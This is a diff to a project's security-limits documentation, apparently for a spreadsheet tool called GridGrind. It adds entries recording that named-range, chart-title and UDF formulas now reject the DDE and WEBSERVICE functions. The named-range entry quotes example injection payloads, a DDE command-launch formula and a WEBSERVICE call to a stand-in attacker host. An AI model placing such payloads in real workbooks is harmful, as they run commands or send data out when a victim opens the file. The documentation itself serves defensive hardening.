@@ -361,6 +361,60 @@ Excel client to send cell data to an attacker-controlled server without any user
 
 ---
 
+### LIM-032 — Named-Range Formula Injection
+
+| Field | Value |
+|:------|:------|
+| **Category** | GridGrind |
+| **Limit** | Named-range formula targets must not use the `DDE` or `WEBSERVICE` functions |
+| **Error** | `IllegalArgumentException`: formula must not use the DDE/WEBSERVICE function |
+| **Applies to** | `NamedRangeTarget.Formula` |
+| **Code** | `NamedRangeTarget.Formula // LIM-032`; `FormulaInputSecurity.rejectDde // LIM-032` |
+| **UX** | Not surfaced in help |
+
+Named-range formulas are written into the xlsx defined-names part and evaluated automatically by
+Excel when the workbook is opened or any formula references the named range. A `NamedRangeTarget`
+with `kind: FORMULA` and a payload such as `DDE("cmd","/C calc","")` or
+`WEBSERVICE("https://attacker.example.com/")` would execute without any user interaction.
+`NamedRangeTarget.Formula` now calls `FormulaInputSecurity.rejectDde` in its compact constructor.
+
+---
+
+### LIM-033 — Chart Title Formula Injection
+
+| Field | Value |
+|:------|:------|
+| **Category** | GridGrind |
+| **Limit** | Chart title formula inputs must not use the `DDE` or `WEBSERVICE` functions |
+| **Error** | `IllegalArgumentException`: formula must not use the DDE/WEBSERVICE function |
+| **Applies to** | `ChartTitleInput.Formula` |
+| **Code** | `ChartTitleInput.Formula // LIM-033`; `FormulaInputSecurity.rejectDde // LIM-033` |
+| **UX** | Not surfaced in help |
+
+Chart title formulas are stored in the chart XML and auto-evaluated when Excel renders the chart
+on workbook open. A `ChartTitleInput` with `type: FORMULA` and a DDE or WEBSERVICE payload executes
+without user interaction. `ChartTitleInput.Formula` now calls `FormulaInputSecurity.rejectDde`.
+
+---
+
+### LIM-034 — UDF Formula Template Injection (Defense-in-Depth)
+
+| Field | Value |
+|:------|:------|
+| **Category** | GridGrind |
+| **Limit** | UDF formula templates must not use the `DDE` or `WEBSERVICE` functions |
+| **Error** | `IllegalArgumentException`: formula must not use the DDE/WEBSERVICE function |
+| **Applies to** | `FormulaUdfFunctionInput.formulaTemplate` |
+| **Code** | `FormulaUdfFunctionInput // LIM-034`; `FormulaInputSecurity.rejectDde // LIM-034` |
+| **UX** | Not surfaced in help |
+
+UDF formula templates are evaluated server-side only by Apache POI, which does not implement DDE
+or WEBSERVICE and would return an evaluation error for those functions. Templates are also never
+written to xlsx output — only the UDF call site (e.g., `MY_FUNC(arg)`) appears in the file.
+The guard is applied as defense-in-depth against future POI changes or alternative evaluation paths.
+
+---
+
 ## Excel / Apache POI Structural Limits
 
 This section mixes two kinds of upstream-driven constraints:
